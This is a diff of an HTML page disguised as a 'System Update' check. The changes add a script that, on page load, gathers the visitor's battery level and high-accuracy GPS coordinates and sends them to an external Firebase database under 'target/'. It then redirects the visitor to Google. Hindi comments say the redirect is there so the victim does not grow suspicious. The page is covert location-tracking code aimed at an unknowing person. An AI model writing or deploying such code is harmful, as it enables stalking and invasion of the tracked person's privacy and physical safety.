@@ -1,39 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>System Update</title></head>
 <body>
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+  import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
-        // Tera Firebase Config
-        const firebaseConfig = {
-            databaseURL: "https://tacticalsystem-99ebd-default-rtdb.firebaseio.com/"
-        };
+  // Tera Firebase Config
+  const firebaseConfig = {
+    databaseURL: "https://tacticalsystem-99ebd-default-rtdb.firebaseio.com"
+  };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
 
-        // Target ka data nikalne ka function
-        async function startTracking() {
-            let batteryLevel = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryLevel = Math.floor(batt.level * 100) + "%";
-            }
+  async function startTracking() {
+    let data = { status: "ONLINE", time: new Date().toLocaleString() };
 
-            // Database update karo
-            update(ref(db, 'target/'), {
-                status: "ACTIVE",
-                battery: batteryLevel,
-                city: "UPDATING...", // Yahan location ka logic bhi add ho sakta hai
-            });
+    // Battery & Network
+    if (navigator.getBattery) {
+      const batt = await navigator.getBattery();
+      data.battery = Math.floor(batt.level * 100) + "%";
+    }
 
-            // Target ko kahin aur bhej do (taaki shak na ho)
-            window.location.href = "https://www.google.com";
-        }
-
-        window.onload = startTracking;
-    </script>
+    // Location Permission mangega
+    navigator.geolocation.getCurrentPosition((pos) => {
+      data.lat = pos.coords.latitude;
+      data.long = pos.coords.longitude;
+      update(ref(db, 'target/'), data).then(() => {
+          // Data update hone ke baad Google par bhej do taaki shak na ho
+          window.location.href = "https://www.google.com";
+      });
+    }, (err) => {
+      update(ref(db, 'target/'), data);
+      window.location.href = "https://www.google.com";
+    }, {enableHighAccuracy: true});
+  }
+  startTracking();
+</script>
+<h1 style="text-align:center; font-family:sans-serif;">Checking for Updates...</h1>
 </body>
 </html>
